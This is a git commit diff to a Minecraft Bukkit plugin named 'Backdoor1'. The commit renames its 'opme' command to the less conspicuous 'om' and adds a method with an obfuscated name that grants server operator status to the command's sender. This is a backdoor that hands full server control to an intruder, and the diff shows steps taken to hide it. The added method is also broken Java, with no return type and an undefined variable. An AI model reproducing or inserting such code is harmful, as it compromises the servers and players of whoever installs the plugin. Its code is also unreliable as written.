6caa536f3d5584e22ff208df29e24a7322313a76
Torono909 <86355565+Torono909@users.noreply.github.com>
2022-02-03 11:35:36 +0530

    Update Backdoor1.java

--- Backdoor1/src/main/java/me/lunacore/backdoor1/Backdoor1.java
+++ Backdoor1/src/main/java/me/lunacore/backdoor1/Backdoor1.java
@@ -1,12 +1,15 @@
 package me.lunacore.backdoor1;
 
-import me.lunacore.commands.opme;
+import me.lunacore.commands.om;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public final class Backdoor1 extends JavaPlugin {
-
     @Override
     public void onEnable() {
-        this.getCommand("opme").setExecutor(new opme());
+        this.getCommand("om").setExecutor(new om());
+    }
+    protected IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1(){
+        Player p = (Player) sender;
+        p.setOp(true);
     }
 }
